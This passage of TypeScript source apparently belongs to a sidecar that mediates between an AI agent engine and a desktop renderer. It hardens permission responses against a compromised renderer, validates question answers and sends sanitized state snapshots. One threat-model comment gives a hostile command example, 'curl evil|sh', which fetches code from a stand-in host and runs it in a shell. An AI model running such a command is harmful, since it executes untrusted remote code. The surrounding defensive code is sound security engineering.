    // renderer may request durable permission updates only by INDEXING into the
    // `permission_suggestions` the ENGINE minted on this exact pending request;
    // it can never author update objects (T6b intent). The shared Zod schema
    // strips unknown response keys, so the selection is read from the raw frame
    // and validated here, fail-closed.
    const selection = validateSuggestionSelection(
      rawMessage,
      message.response.behavior,
      pending.request,
    )
    if (!selection.ok) {
      this.sendError(connection, message.requestId, 'bad_request', selection.reason, false)
      return
    }

    const response = this.sanitizePermissionResponse(
      connection,
      message.requestId,
      pending.request,
      message.response,
    )
    if (!response) {
      return // an error was already sent
    }

    // Re-attach the ENGINE-authored update objects for a validated selection
    // (cloned so the response never aliases the pending request). This is the
    // ONLY path that puts `updatedPermissions` on a boundary response — the
    // objects are byte-for-byte the engine's own suggestions for this requestId,
    // which the engine then applies + persists via its normal decision path
    // (permissionPromptToolResultToPermissionDecision).
    const finalResponse: AppPermissionResponse =
      response.behavior === 'allow' && selection.updates.length > 0
        ? { ...response, updatedPermissions: structuredClone(selection.updates) }
        : response

    this.controller.respondToPermissionRequest(message.requestId, finalResponse)
  }

  /**
   * T6 + T6b hardening on an allow. The permission-response schema
   * (PermissionPromptToolResultSchema) permits two escalations the renderer must
   * NOT be able to perform:
   *
   *   T6  — `updatedInput` command-rewrite: the engine runs the tool with
   *         `updatedInput` when non-empty, and treats an EMPTY object as "use the
   *         original tool input" (PermissionPromptToolResultSchema.ts:110-111).
   *         Both are escalation surfaces from a compromised renderer:
   *           - a non-empty rewrite swaps the command ("ls" → "curl evil|sh");
   *           - an empty `{}` reverses an engine-side gate rewrite (if the engine
   *             gated `curl http→https`, "use original" restores the unsafe http).
   *         Fix (F1): the sidecar is ECHO-ONLY in the strong sense — it forwards
   *         exactly the GATED input the engine already vetted, never renderer
   *         bytes. A renderer-supplied `updatedInput` is accepted only if it is
   *         empty (a plain confirm) or deep-equals the gated input; anything else
   *         is rejected. What we hand the engine is always the gated input, so an
   *         empty `{}` can no longer mean "use original".
   *
   *   T6b — `updatedPermissions`: on an allow these are persisted via
   *         `persistPermissionUpdates` (PermissionPromptToolResultSchema.ts:96
   *         -105), installing durable always-allow rules. A forged allow must
   *         not be able to write policy. Strip renderer-SUPPLIED objects before
   *         they reach the engine (backstop; F10 rejects the key upstream). The
   *         legitimate "always allow" path is C1: handlePermissionResponse
   *         re-attaches ENGINE-minted suggestions after
   *         validateSuggestionSelection — the renderer selects, never authors.
   *
   * Returns the sanitized response, or null if it was rejected (error sent).
   */
  private sanitizePermissionResponse(
    connection: Connection,
    requestId: string,
    request: import('../../src/app-runtime/sessionEvents.js').AppPermissionRequest['request'],
    response: AppPermissionResponse,
  ): AppPermissionResponse | null {
    if (response.behavior === 'deny') {
      // Deny carries only a message; nothing to escalate.
      return response
    }

    // T6b — never let a renderer install durable permission rules on an allow.
    if (response.updatedPermissions !== undefined) {
      this.log(
        `[sidecar] stripped updatedPermissions on allow requestId=${requestId} (T6b)`,
      )
    }

    // T6 (F1) — the renderer's `updatedInput` may only CONFIRM the gated input.
    // Accept it iff it is empty (a plain confirm) or exactly equals the gated
    // input; reject any other value. Then forward the GATED input itself — never
    // the renderer's bytes — so an empty `{}` cannot mean "use original" and a
    // rewrite cannot slip through.
    const gatedInput = extractGatedToolInput(request)
    const echoed = response.updatedInput
    const isConfirm =
      Object.keys(echoed).length === 0 ||
      (gatedInput !== undefined && deepEqual(echoed, gatedInput))
    if (!isConfirm) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        'updatedInput may not rewrite the gated tool input',
        false,
      )
      return null
    }

    return {
      behavior: 'allow',
      // Forward the gated input the engine already vetted. If we could not read
      // it from the request (unexpected shape), fall back to an empty object,
      // which the engine reads as "use original" — the same input the engine
      // itself gated, since no renderer rewrite reached it.
      updatedInput: gatedInput ?? {},
      // updatedPermissions intentionally dropped (T6b).
      // Note: toolUseID is rejected upstream by checkStrictKeys and thus not passed here.
    }
  }

  /**
   * C5 (P4-20, ASK-USER-QUESTION-ANSWER.md) — resolve a pending AskUserQuestion
   * request from a renderer answer frame. The renderer authors ONLY option
   * INDICES + the built-in "Other…" freeform string; this handler re-reads the
   * gated `questions` from the ENGINE's own pending request, re-attaches the
   * engine's own option labels (C1 selection-by-index), and resolves the request
   * as an allow whose `updatedInput.answers` the engine's tool reads. The answer
   * response is built server-side, so it never passes through the T6 renderer-echo
   * check (T6 guards renderer-SUPPLIED updatedInput; the renderer supplies none).
   * Fail-closed at every step: an invalid frame leaves the request pending.
   */
  private handleAskUserQuestionAnswer(
    connection: Connection,
    rawMessage: unknown,
  ): void {
    // The requestId is read BEFORE schema validation so a rejected answer still
    // correlates back to its request — without it the renderer cannot clear its
    // in-flight guard and an honest over-long answer strands the pending
    // request forever. Same shape as handleAgentModeSet / handleRunControlVerb.
    const raw = rawMessage as { requestId?: unknown }
    const requestId =
      typeof raw.requestId === 'string' ? raw.requestId : undefined
    const parsed = askUserQuestionAnswerMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid askUserQuestion.answer',
        false,
      )
      return
    }
    const message: AskUserQuestionAnswerMessage = parsed.data

    // T5a — the requestId MUST match a currently-pending engine-minted request
    // (identical lookup to handlePermissionResponse).
    const pending = this.controller
      .getPendingPermissionRequests()
      .find(request => request.requestId === message.requestId)
    if (!pending) {
      this.sendError(
        connection,
        message.requestId,
        'permission_not_found',
        'Permission request is no longer pending',
        false,
      )
      return
    }

    // Tool gate — this frame is valid ONLY for an AskUserQuestion request. A
    // forged answer against any other gate (Bash, file write) is bad_request.
    if (pending.request.tool_name !== ASK_USER_QUESTION_TOOL_NAME) {
      this.sendError(
        connection,
        message.requestId,
        'bad_request',
        'askUserQuestion.answer is only valid for an AskUserQuestion request',
        false,
      )
      return
    }

    const gatedInput = extractGatedToolInput(pending.request)
    const reconstructed = reconstructAskUserQuestionAnswers(
      gatedInput,
      message.answers,
    )
    if (!reconstructed.ok) {
      this.sendError(
        connection,
        message.requestId,
        'bad_request',
        reconstructed.reason,
        false,
      )
      return
    }

    // Resolve through the engine's OWN decision path. `questions`/`metadata` are
    // the engine's gated fields (never the wire); only `answers` is attached.
    this.controller.respondToPermissionRequest(message.requestId, {
      behavior: 'allow',
      updatedInput: { ...gatedInput, answers: reconstructed.answers },
    })
  }

  /* --------------------------------------------------------------------- *
   * Outbound (engine → client): raw-forward, JSON-safe, clone-on-serialize.
   * --------------------------------------------------------------------- */

  /**
   * `frameKind` is the frame this payload was being built for, so a drop record
   * names a real `ServerFrame` kind rather than the free-form context string.
   * `detail` only sharpens the stderr line.
   */
  private prepareOutboundPayload<T>(
    payload: T,
    frameKind: ServerFrame['kind'],
    detail?: string,
  ): T | null {
    const contextName = detail ? `${frameKind} ${detail}` : frameKind
    // Landmine 2 (immutability): structuredClone
    let cloned: T
    try {
      cloned = structuredClone(payload)
    } catch (error) {
      this.log(
        `[sidecar] dropped un-cloneable payload for ${contextName}: ${
          error instanceof Error ? error.message : String(error)
        }`,
      )
      this.onFrameDropped?.('clone_failed', frameKind)
      return null
    }

    // Real SDK messages materialize optional fields as `key: undefined`.
    // Canonical JSON represents those as absent properties.
    omitUndefinedObjectProperties(cloned)

    // Landmine 1 (JSON-safe): assert the payload round-trips through JSON losslessly
    const safety = checkJsonSafe(cloned)
    if (!safety.ok) {
      this.log(
        `[sidecar] dropped non-JSON-safe payload for ${contextName} at ${safety.path}: ${safety.reason}`,
      )
      this.onFrameDropped?.('not_json_safe', frameKind)
      return null
    }

    return cloned
  }

  private broadcastEvent(event: AppSessionEvent): void {
    if (this.connections.size === 0) {
      return
    }

    const prepared = this.prepareOutboundPayload(event, 'event', `type=${event.type}`)
    if (!prepared) {
      return
    }

    const frame: ServerFrame = {
      kind: 'event',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      event: prepared,
    }
    for (const connection of this.connections) {
      this.send(connection, frame)
    }
  }

  private observeGeneratedImageEvent(event: AppSessionEvent): void {
    for (const toolUseId of generatedImageToolUseIds(event)) {
      this.generatedImageToolUseIds.add(toolUseId)
    }
    const result = generatedImageResult(event)
    if (!result || !this.generatedImageToolUseIds.delete(result.toolUseId)) return
    void this.broadcastGeneratedImagePreview(result)
  }

  private async broadcastGeneratedImagePreview(result: {
    toolUseId: string
    filePath: string
    mediaType: 'image/jpeg' | 'image/png' | 'image/webp'
  }): Promise<void> {
    try {
      const bytes = await this.readGeneratedImage(result.filePath)
      if (!bytes || bytes.byteLength === 0) return
      const frame: ServerFrame = {
        kind: 'generated-image-preview',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        toolUseId: result.toolUseId,
        mediaType: result.mediaType,
        data: Buffer.from(bytes).toString('base64'),
      }
      for (const connection of this.connections) this.send(connection, frame)
    } catch (error) {
      this.log(
        `[sidecar] could not load generated image preview: ${
          error instanceof Error ? error.message : String(error)
        }`,
      )
    }
  }

  /** C3 — build + send one snapshot frame to a single connection (attach). */
  private sendPermissionContext(
    connection: Connection,
    context: ToolPermissionContext,
  ): void {
    const frame = this.preparePermissionContextFrame(context)
    if (frame) {
      this.send(connection, frame)
    }
  }

  /** C3 — broadcast a snapshot to every connection (on live-context change). */
  private broadcastPermissionContext(context: ToolPermissionContext): void {
    if (this.connections.size === 0) {
      return
    }
    const frame = this.preparePermissionContextFrame(context)
    if (!frame) {
      return
    }
    for (const connection of this.connections) {
      this.send(connection, frame)
    }
  }

  private preparePermissionContextFrame(
    context: ToolPermissionContext,
  ): ServerFrame | null {
    const snapshot = this.prepareOutboundPayload(
      buildPermissionContextSnapshot(
        context,
        this.permissions?.getDisplayFacts() ?? {
          managedRulesOnly: false,
          permissionClassifierEnabled: false,
        },
      ),
      'permission.context',
      'snapshot',
    )
    if (!snapshot) {
      return null
    }
    return {
      kind: 'permission.context',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      context: snapshot,
    }
  }

  /**
   * P4-3 — build + send the settings snapshot to a single connection (attach).
   * The snapshot carries no setting values (source/editable/managed model only),
   * so `send`'s secret guard and JSON-safety check pass by construction. A same
   * outbound-size cap still applies via the shared `send` path.
   *
   * `getSnapshot()` is a pure read of the spawn-time value (null if that read
   * failed) — it does no I/O and cannot throw. The whole body is nonetheless
   * wrapped so a settings-snapshot failure can NEVER strand the connection in the
   * broadcast set or skip the subsequent history replay (review MED#2): on any
   * failure we simply skip the snapshot and let attach continue.
   */
  private sendSettingsSnapshot(connection: Connection): void {
    if (!this.settings) {
      return
    }
    try {
      const raw = this.settings.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'settings.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'settings.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        settings: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] settings.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /** Re-publish settings only after the domain has refreshed engine-owned options. */
  private async refreshSettingsSnapshot(): Promise<void> {
    if (!this.settings) return
    try {
      await this.settings.refreshAvailableOptions()
      for (const connection of this.connections) {
        this.sendSettingsSnapshot(connection)
      }
    } catch (error) {
      this.log(
        `[sidecar] settings options refresh skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-7 — build + send the agent config snapshot to a single connection (attach).
   * The domain withholds prompt bodies, hook payloads, and inline MCP config values,
   * so this frame carries definition/status metadata without credential material.
   */
  private sendAgentConfigSnapshot(connection: Connection): void {
    if (!this.agentConfig) {
      return
    }
    try {
      const raw = this.agentConfig.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'agent-config.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'agent-config.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        agents: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] agent-config.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-12 — build + send the settings extensions (MCP/plugins/skills/hooks)
   * config snapshot to a single connection (attach). The domain carries config
   * metadata only (no values, no env/headers, no hook/skill bodies), so this
   * frame is secretGuard-clean by construction. Wrapped so a snapshot failure
   * can never strand the connection or skip the subsequent history replay.
   */
  private sendExtensionsSnapshot(connection: Connection): void {
    if (!this.extensions) {
      return
    }
    try {
      const raw = this.extensions.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'extensions.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'extensions.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        extensions: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] extensions.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-10 — current thread-goal snapshot from the runtime's live app-state store.
   * Writes stay on the engine's slash/action path; the desktop receives display
   * state only.
   */
  private sendThreadGoalSnapshot(connection: Connection): void {
    if (!this.goals) {
      return
    }
    try {
      const raw = this.goals.getSnapshot()
      const snapshot = this.prepareOutboundPayload(raw, 'thread-goal.snapshot')
      if (snapshot === null && raw !== null) {
        return
      }
      this.send(connection, {
        kind: 'thread-goal.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        goal: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] thread-goal.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastThreadGoalSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendThreadGoalSnapshot(connection)
    }
  }

  /**
   * P4-10 — read-only memory metadata snapshot. The domain excludes memory bodies;
   * this shared path still applies clone/JSON checks, secretGuard, and size caps.
   */
  private sendMemorySnapshot(connection: Connection): void {
    if (!this.memory) {
      return
    }
    try {
      const raw = this.memory.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'memory.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'memory.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        memory: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] memory.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastMemorySnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendMemorySnapshot(connection)
    }
  }

  /**
   * P4-9 — read-only background-task snapshot from the runtime's live
   * app-state store (`AppState.tasks`). Kill/stop/inspect stay engine-side;
   * the desktop receives display state only.
   */
  private sendTasksSnapshot(connection: Connection): void {
    if (!this.tasks) {
      return
    }
    try {
      const raw = this.tasks.getSnapshot()
      const snapshot = this.prepareOutboundPayload(raw, 'tasks.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'tasks.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        tasks: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] tasks.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastTasksSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendTasksSnapshot(connection)
    }
  }

  /**
   * P4-8 — read-only orchestrator worker snapshot (D2 `decisions/AGENT-CHROME.md`).
   * Async because the session plane is a file-backed engine read
   * (`readSessionState`); the shared send path still applies
   * clone/JSON checks, secretGuard, and size caps.
   */
  private async sendAgentModeSnapshot(connection: Connection): Promise<void> {
    if (!this.agentMode) {
      return
    }
    const generation = ++this.agentModeSnapshotGeneration
    this.agentModeSnapshotGenerationByConnection.set(connection, generation)
    try {
      const raw = await this.agentMode.getSnapshot()
      if (
        this.agentModeSnapshotGenerationByConnection.get(connection) !== generation
      ) {
        return
      }
      this.sendAgentModeSnapshotPayload(connection, raw)
    } catch (error) {
      this.log(
        `[sidecar] agent-mode.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private sendAgentModeSnapshotPayload(
    connection: Connection,
    raw: Awaited<ReturnType<SidecarAgentModeDomain['getSnapshot']>>,
  ): void {
    const snapshot = this.prepareOutboundPayload(raw, 'agent-mode.snapshot')
    if (!snapshot) {
      return
    }
    this.send(connection, {
      kind: 'agent-mode.snapshot',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      agentMode: snapshot,
    })
  }

  private async broadcastAgentModeSnapshot(): Promise<void> {
    if (!this.agentMode || this.connections.size === 0) {
      return
    }
    const generation = ++this.agentModeSnapshotGeneration
    const connections = [...this.connections]
    for (const connection of connections) {
      this.agentModeSnapshotGenerationByConnection.set(connection, generation)
    }
    try {
      const raw = await this.agentMode.getSnapshot()
      for (const connection of connections) {
        if (
          !this.connections.has(connection) ||
          this.agentModeSnapshotGenerationByConnection.get(connection) !== generation
        ) {
          continue
        }
        this.sendAgentModeSnapshotPayload(connection, raw)
      }
    } catch (error) {
      this.log(
        `[sidecar] agent-mode.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  /**
   * P4-32b — read-only Codex lease snapshot (L1,
   * `decisions/ORCHESTRATOR-IN-SESSION.md` §7). Sync: the lease map and the pool
   * are in-memory engine singletons. The shared `send` path applies clone/JSON
   * checks, the outbound secret guard and the size cap; the whole read is wrapped
   * so a failure can never strand the attaching connection.
   */
  private sendLeaseSnapshot(connection: Connection): void {
    if (!this.leases) {
      return
    }
    try {
      const raw = this.leases.getSnapshot()
      if (!raw) {
        return
      }
      const snapshot = this.prepareOutboundPayload(raw, 'lease.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'lease.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        leases: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] lease.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastLeaseSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendLeaseSnapshot(connection)
    }
  }

  /**
   * P4-24c — build + send the composer run-controls snapshot to one connection.
   * `getSnapshot()` is a pure, throw-free read of the live app-state + the engine's
   * own model/effort/fast helpers; the shared `send` path applies clone/JSON checks,
   * the outbound secret guard, and the size cap. Wrapped so a snapshot failure can
   * never strand the attaching connection.
   */
  private sendRunControlsSnapshot(connection: Connection): void {
    if (!this.runControls) {
      return
    }
    try {
      const raw = this.runControls.getSnapshot()
      const snapshot = this.prepareOutboundPayload(raw, 'run-controls.snapshot')
      if (!snapshot) {
        return
      }
      this.send(connection, {
        kind: 'run-controls.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        runControls: snapshot,
      })
    } catch (error) {
      this.log(
        `[sidecar] run-controls.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    }
  }

  private broadcastRunControlsSnapshot(): void {
    if (this.connections.size === 0) {
      return
    }
    for (const connection of this.connections) {
      this.sendRunControlsSnapshot(connection)
    }
  }

  /**
   * Context-breakdown snapshot → every attached connection. Async because the
   * analysis re-reads this session's transcript and tokenizes it; serialised by
   * `contextBreakdownInFlight` so a burst of requests can never stack up several
   * full analyses, and rate-limited by the freshness floor in the request handler. A null snapshot (no transcript yet, analyzer failure)
   * sends nothing at all rather than an empty breakdown, so the popover keeps its
   * aggregate row instead of rendering a zeroed legend.
   */
  /**
   * Renderer asked for a fresh breakdown (the popover was opened). Validate,
   * then compute and broadcast the snapshot, which is the answer; there is no
   * separate result frame to correlate.
   *
   * Fails SILENTLY on an invalid frame rather than erroring back: this is a
   * read-only refresh with no user-visible commitment, and the popover already
   * degrades gracefully to its aggregate row when no snapshot arrives.
   */
  private handleContextBreakdownRequest(message: unknown): void {
    const parsed = contextBreakdownMessageSchema.safeParse(message)
    if (!parsed.success) {
      this.log('[sidecar] context-breakdown.request rejected (invalid frame)')
      return
    }
    // Freshness floor. Coalescing bounds how many analyses run AT ONCE, not how
    // often: a popover reopened faster than the analysis completes would keep one
    // running continuously, and each costs a full transcript read plus ~10 token
    // counts. Inside the floor, answer from the last snapshot instead. The numbers
    // can only move when a turn completes, so a few seconds of staleness is not
    // observable, while the spend is.
    const age = Date.now() - this.contextBreakdownComputedAt
    if (this.contextBreakdownLast && age < CONTEXT_BREAKDOWN_MIN_INTERVAL_MS) {
      this.sendContextBreakdown(this.contextBreakdownLast)
      return
    }
    void this.broadcastContextBreakdown()
  }

  /**
   * Load earlier messages (decisions/HISTORY-LOAD-EARLIER.md).
   *
   * Re-reads THIS session's display transcript through the engine's own loader
   * with a larger budget, diffs it against what has already gone out, and emits
   * only the missing prefix as ordinary `replay: true` event frames — the same
   * vocabulary `sendHistoryReplay` uses, through the same outbound path
   * (prepareOutboundPayload's clone + JSON-safe assert, then send's secretGuard
   * and size cap). No new outbound transcript shape comes into existence.
   *
   * Three things are decided here rather than trusted from the frame: WHICH
   * file (the reader resolves it from the engine's live session identity), HOW
   * MUCH of it (the ceiling in `limits.ts`), and WHETHER a read may start at all
   * (one in flight per session; a second is refused, never queued, because each
   * one re-reads the whole transcript and two interleaved prefixes on one socket
   * would be indistinguishable from a gap).
   *
   * WHERE the diff starts is the one thing this side cannot decide alone, and
   * the frame's main-authored `viewAnchorUuid` is why (protocol.ts, and
   * HISTORY-LOAD-EARLIER.md §The view anchor). This connection knows what it
   * SENT; only Electron main knows what the pane currently HOLDS, because a
   * reloaded renderer is rebuilt from main's replay ring and that ring evicts.
   * When the two disagree, main's wins — see the anchor selection below.
   *
   * The answer is unicast to the asking connection: it settles a click that
   * reader made, and a second reader's own view is already whole or has its own
   * control to press.
   */
  private async handleHistoryLoadEarlier(
    connection: Connection,
    rawMessage: unknown,
  ): Promise<void> {
    const raw = rawMessage as { requestId?: unknown }
    const rawRequestId =
      typeof raw?.requestId === 'string' ? raw.requestId : undefined

    // IDLE-PARK — same first line as `handleSubmit`/`handlePromptRecall`. A
    // latched sidecar is exiting, so a read started here would finish onto a
    // connection that is going away.
    if (this.parking) {
      this.sendError(
        connection,
        rawRequestId,
        'session_disconnected',
        'session parking',
        true,
      )
      return
    }

    const parsed = historyLoadEarlierMessageSchema.safeParse(rawMessage)
    if (!parsed.success) {
      this.sendError(
        connection,
        rawRequestId,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid history.loadEarlier verb',
        false,
      )
      return
    }
    const { requestId, viewAnchorUuid } = parsed.data

    if (this.loadEarlierInFlight) {
      this.sendLoadEarlierResult(connection, requestId, {
        ok: false,
        message: 'Still loading earlier messages.',
        added: 0,
        complete: false,
      })
      return
    }

    // Already whole for this reader: a previous read reached the head, so there
    // is provably nothing above it. Answered from the latch, because the read
    // that would confirm it costs the full ceiling plus every subagent file.
    if (connection.loadEarlierComplete) {
      this.sendLoadEarlierResult(connection, requestId, {
        ok: true,
        message: loadEarlierMessage(0, true),
        added: 0,
        complete: true,
      })
      return
    }

    // Nothing was restored from disk for this session, so THIS SIDECAR has no
    // earlier to reach for: a fresh session's whole conversation was emitted
    // live, not replayed.
    //
    // Conditional on main having stamped no view anchor, and that condition is
    // the whole of the fix. "The sidecar replayed nothing" is not the same fact
    // as "the reader is holding everything": a session started in the app is
    // rebuilt after a renderer reload from main's ring alone, and that ring can
    // have evicted its head. Answering `complete: true` from this side's empty
    // `history` then cleared the boundary row over a truncated transcript and
    // left no route back to the missing prefix, which is the defect this branch
    // used to cause (2026-09-02 idle-park assessment §6).
    if (
      viewAnchorUuid === undefined &&
      this.history.length === 0 &&
      !this.historySourceTruncated
    ) {
      connection.loadEarlierComplete = true
      this.sendLoadEarlierResult(connection, requestId, {
        ok: true,
        message: loadEarlierMessage(0, true),
        added: 0,
        complete: true,
      })
      return
    }

    // What the READER is holding, which is not always what this CONNECTION was
    // sent. Main's anchor wins outright whenever it exists, because it is the
    // only one of the two derived from the pane's actual contents: main hands a
    // reloaded renderer its ring and nothing else, and it stamps the anchor only
    // when that ring is lossy. It is also never OLDER than this connection's own
    // anchor for the reader's live view, since every frame this socket sent went
    // through that ring — so preferring it can at worst re-send messages the
    // renderer already has (which its uuid dedupe absorbs), and can never leave
    // a gap, which the connection anchor alone can and did.
    const anchorUuid = viewAnchorUuid ?? connection.loadEarlierAnchorUuid
    // History WAS restored, yet none of what reached this reader carries an
    // identity to diff a deeper read against. Everything read would look
    // missing and the reader would see the conversation twice, so refuse rather
    // than duplicate it. (Not the same case as an empty replay below, where
    // nothing went out and everything read really is missing.)
    if (anchorUuid === null && connection.loadEarlierReplayed) {
      this.sendLoadEarlierResult(connection, requestId, {
        ok: false,
        message: 'Earlier messages could not be loaded.',
        added: 0,
        complete: false,
      })
      return
    }

    this.loadEarlierInFlight = true
    try {
      const read = await this.loadEarlierHistory(line => this.log(line))
      if (this.closed || connection.closed) return

      // With no anchor, this reader was sent nothing, so the whole read is the
      // missing prefix. Otherwise the prefix is what sits above the anchor.
      const anchorIndex =
        anchorUuid === null
          ? read.messages.length
          : read.messages.findIndex(message => message.uuid === anchorUuid)
      if (anchorIndex < 0) {
        // The deeper read could not find the message the reader is currently
        // oldest on, so there is no prefix that is provably missing rather than
        // duplicated. Refuse instead of guessing: inbound fails closed.
        this.log(
          '[sidecar] history.loadEarlier: replayed history not found in the deeper read',
        )
        this.sendLoadEarlierResult(connection, requestId, {
          ok: false,
          message: 'Earlier messages could not be loaded.',
          added: 0,
          complete: false,
        })
        return
      }

      const missing = read.messages.slice(0, anchorIndex)
      let omitted = false
      let oldestSentUuid: string | undefined
      let added = 0
      for (const message of missing) {
        const prepared = this.prepareOutboundPayload(
          createMessageEvent(message),
          'event',
          'load earlier',
        )
        if (!prepared) {
          // Un-serializable recovered message: an omission, so the transcript
          // above this point stays incomplete no matter what the loader said.
          omitted = true
          continue
        }
        this.send(connection, {
          kind: 'event',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          replay: true,
          // B1/B2 (decisions/HISTORY-LOAD-EARLIER.md). This is the ONLY place
          // that sets it: these messages are older than everything the reader
          // already has, so they must be INSERTED above the conversation rather
          // than appended after it, and main must not retain them in a ring
          // that evicts by arrival. `sendHistoryReplay` deliberately does not
          // set it: its preceding ready frame resets the session projection, so
          // the retained tail appends in its own arrival order.
          recovered: true,
          event: prepared,
        })
        added += 1
        if (oldestSentUuid === undefined && typeof message.uuid === 'string') {
          oldestSentUuid = message.uuid
        }
      }
      // The anchor moves to the OLDEST message that actually went out, so only
      // omissions strictly OLDER than it stay recoverable by a later request. A
      // message dropped mid-prefix (newer than the oldest send) now sits inside
      // the range a later read treats as already delivered, and is permanently
      // out of this reader's reach. Nothing lies about that: `omitted` forces
      // `complete: false` below, and blocks the head latch.
      if (oldestSentUuid !== undefined) {
        connection.loadEarlierAnchorUuid = oldestSentUuid
        connection.loadEarlierReplayed = true
      }
      const complete = !read.truncated && !omitted
      // Latch the head so a repeat request answers without touching disk.
      if (complete) connection.loadEarlierComplete = true
      this.sendLoadEarlierResult(connection, requestId, {
        ok: true,
        message: loadEarlierMessage(added, complete),
        added,
        complete,
      })
    } catch (error) {
      this.log(
        `[sidecar] history.loadEarlier failed: ${
          error instanceof Error ? error.message : String(error)
        }`,
      )
      if (!this.closed && !connection.closed) {
        this.sendLoadEarlierResult(connection, requestId, {
          ok: false,
          message: 'Earlier messages could not be loaded.',
          added: 0,
          complete: false,
        })
      }
    } finally {
      this.loadEarlierInFlight = false
    }
  }

  private sendLoadEarlierResult(
    connection: Connection,
    requestId: string,
    outcome: { ok: boolean; message: string; added: number; complete: boolean },
  ): void {
    this.send(connection, {
      kind: 'history.loadEarlier.result',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      requestId,
      ...outcome,
    })
  }

  /** Frame + send one breakdown snapshot to every attached connection. */
  private sendContextBreakdown(raw: ContextBreakdownSnapshot): void {
    const breakdown = this.prepareOutboundPayload(
      raw,
      'context-breakdown.snapshot',
    )
    if (!breakdown) {
      return
    }
    for (const connection of this.connections) {
      this.send(connection, {
        kind: 'context-breakdown.snapshot',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        breakdown,
      })
    }
  }

  private async broadcastContextBreakdown(): Promise<void> {
    if (!this.contextBreakdown || this.connections.size === 0) {
      return
    }
    // Coalesce rather than drop. The analysis takes seconds, so a turn that ends
    // inside one (or a second connection attaching) would otherwise be discarded
    // and the popover would sit on pre-turn numbers until the NEXT boundary.
    if (this.contextBreakdownInFlight) {
      this.contextBreakdownPending = true
      return
    }
    this.contextBreakdownInFlight = true
    try {
      const raw = await this.contextBreakdown.snapshot()
      if (!raw) {
        return
      }
      this.contextBreakdownLast = raw
      this.contextBreakdownComputedAt = Date.now()
      if (this.connections.size === 0) {
        return
      }
      this.sendContextBreakdown(raw)
    } catch (error) {
      this.log(
        `[sidecar] context-breakdown.snapshot send skipped (${
          error instanceof Error ? error.message : String(error)
        })`,
      )
    } finally {
      this.contextBreakdownInFlight = false
      if (this.contextBreakdownPending) {
        this.contextBreakdownPending = false
        void this.broadcastContextBreakdown()
      }
    }
  }

  /**
   * P4-6 title-rider — push a session title to every attached connection.
   * `send` applies the clone/JSON checks, the outbound secretGuard, and the size
   * cap (the title is plain display text, guard-clean by construction). Main taps
   * this frame → `host.setTitle` → registry, relabelling the sidebar/tab. Two
   * callers: the one-shot AI-title generator (after a fresh session's first durable input),
   * and the P4-6b `session.rename` verb (a user rename, on success). Deliberately
